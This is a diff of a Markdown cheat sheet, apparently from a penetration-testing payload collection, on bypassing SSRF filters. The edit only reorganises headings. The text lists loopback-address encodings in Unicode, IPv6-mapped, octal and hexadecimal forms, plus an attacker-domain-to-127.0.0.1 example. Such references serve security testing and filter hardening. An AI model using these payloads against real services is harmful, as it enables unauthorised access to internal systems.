@@ -53,23 +53,25 @@ Bypass SSRF filters that only allow external domains.
 Example:
 attacker.com → 123.123.123.123 → 127.0.0.1
 
-**Punycode Varients:**
+## IP Encoding Tricks
+
+### **Punycode Varients:**
 * http://①②⑦.⓪.⓪.①/
 * http://⓵⓶⓻.⓪.⓪.⓵/
 
-**IPv6 Format**
+### **IPv6 Format**
 
 Use IPv6-mapped IPv4 address:
 
 http://[::ffff:127.0.0.1]/
 
-**Octal**
+### **Octal**
 
 Each octet in octal (prefix 0):
 
 0177.0000.0000.0001
 
-**Hexadecimal**
+### **Hexadecimal**
 
 Each octet in hex (prefix 0x):
 0x7f.0x00.0x00.0x01
